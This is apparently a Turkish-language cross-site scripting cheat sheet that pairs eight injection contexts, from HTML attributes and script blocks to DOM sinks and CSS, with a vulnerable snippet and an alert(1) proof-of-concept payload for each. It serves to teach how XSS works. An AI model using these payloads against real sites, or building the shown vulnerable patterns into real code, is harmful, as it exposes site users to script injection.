<h1>CONTEXTS</h1>
<br>

<h2>🔹 1. HTML Element Context (Tag Context)</h2>
<h4>User input direkt HTML elementin içine yerleştirilir.</h4><br>

📌 Örnek:  
`<div>PAYLOAD</div>`  
<br>
🎯 Exploit:  
```html
</div><script>alert(1)</script>
```
<br>



<h2>🔹 2. HTML Attribute Context</h2>
<h4>Kullanıcı girdisi HTML elementinin bir attribute değeri içinde kullanılır (örneğin value, title, alt).<br>
Eğer input escape edilmezse, input içinden quote işaretleri çıkılarak attribute sonlandırılabilir ve yeni<br>
attribute veya event handler eklenerek XSS tetiklenebilir.</h4><br>

📌 Örnek:  
`<input type="text" value="PAYLOAD">`  
<br>
🎯 Exploit:  
```html
" autofocus onfocus=alert(1) x="
```
<br>



<h2>🔹 3. HTML Event Handler Context</h2>
<h4>Input bir HTML attribute’u olarak event handler içinde kullanılır (onclick, onerror, onmouseover gibi).<br>
Bu attribute’lar zaten JavaScript çalıştırmaya yönelik olduğu için, input içine uygun payload yerleştirerek<br>
doğrudan kod çalıştırılır.</h4><br>

📌 Örnek:  
`<button onclick="PAYLOAD">Click me</button>`  
<br>
🎯 Exploit:  
```html
" onclick=alert(1) x="
```
<br>



<h2>🔹 4. JavaScript Context (Script Block Injection)</h2>
<h4>Input, bir script bloğuna gömülür.</h4><br>

📌 Örnek:  
```html
<script>
    var name = "PAYLOAD";
</script>
```
<br><br>
🎯 Exploit:  
```js
";alert(1);//
```
<br>



<h2>🔹 5. JavaScript Inline Event Context</h2>
<h4>HTML içinde ama JS çalıştırılır.</h4><br>

📌 Örnek:  
`<button onclick="doSomething('PAYLOAD')">`  
<br>
🎯 Exploit:  
```js
');alert(1);//
```
<br>



<h2>🔹 6. DOM-Based Context (innerHTML, location.hash vs.)</h2>
<h4>JavaScript, kullanıcı girdisini doğrudan DOM'a yansıtır (innerHTML, document.write, location.hash gibi).<br>
Sunucu tarafı etkisizdir, tamamen client-side XSS’tir. Input escape edilmezse HTML/JS kodu doğrudan çalıştırılır.</h4><br>

📌 Örnek:  
`document.body.innerHTML = location.hash;`  
<br>
🎯 Exploit:  
```php
#<img src=x onerror=alert(1)>
```
<br>



<h2>🔹 7. URL / HREF / SRC Context</h2>
<h4>Veri href, src, action gibi URI attribute’larına yazılır.</h4><br>

📌 Örnek:  
`<a href="PAYLOAD">Click</a>`  
<br>
🎯 Exploit:  
```html
javascript:alert(1)
```
<br>



<h2>🔹 8. CSS Context</h2>
<h4>Kullanıcı girdisi doğrudan CSS kodunun içine gömülürse, kötü amaçlı CSS ve JavaScript çalıştırmak mümkün olabilir.<br>
Özellikle url() fonksiyonları ile javascript: protokolü kullanılarak XSS açığı oluşturulabilir.</h4><br>

📌 Örnek:  
```html
<style>
  body { background: PAYLOAD; }
</style>
```
<br>

🎯 Exploit:  
```css
url("javascript:alert(1)")
```
